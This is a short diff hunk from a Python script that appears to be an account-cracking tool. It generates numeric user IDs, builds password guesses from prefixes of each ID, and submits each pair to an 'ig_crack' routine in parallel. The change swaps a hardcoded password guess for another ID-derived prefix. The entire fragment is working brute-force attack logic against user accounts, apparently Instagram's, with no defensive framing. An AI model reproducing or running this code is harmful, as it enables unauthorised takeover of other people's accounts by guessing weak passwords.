@@ -201,7 +201,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = ['57273200',uid[:6],uid[:8],uid] 
+            pww = [uid[:6],uid[:7],uid[:8],uid] 
             KLEINXD.submit(ig_crack, uid, pww, total_idz)
     linex()
     print(f" \033[1;97m[+] Process Completed ")
